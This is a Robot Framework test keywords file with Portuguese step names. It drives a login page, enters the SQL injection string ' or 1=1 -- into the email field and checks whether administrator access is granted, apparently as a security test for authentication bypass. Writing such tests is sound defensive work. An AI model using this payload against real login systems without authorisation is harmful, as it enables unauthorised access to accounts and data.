*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
eu clico em conta
    Wait Until Element Is Visible    ${home.button_account}
    Click Element        ${home.button_account}
    Sleep    3
eu clico em login
    Wait Until Element Is Visible    ${home.button_login}
    Click Element        ${home.button_login}
    Sleep    3
eu preencho o campo de email com SQLi malicioso
    Wait Until Element Is Visible    ${login.field_email} 
    Input Text       ${login.field_email}    ' or 1=1 --
    Sleep    3
eu preencho o campo de senha com qualquer valor
    Wait Until Element Is Visible    ${login.field_password}
    Input Text       ${login.field_password}    123
    Sleep    3
eu pressiono o botão de login
    Wait Until Element Is Visible    ${login.button_login}
    Click Element        ${login.button_login}
    Sleep    3
eu verifico se recebi acesso de administrador
    Wait Until Page Contains    ${home.profile_admin}    30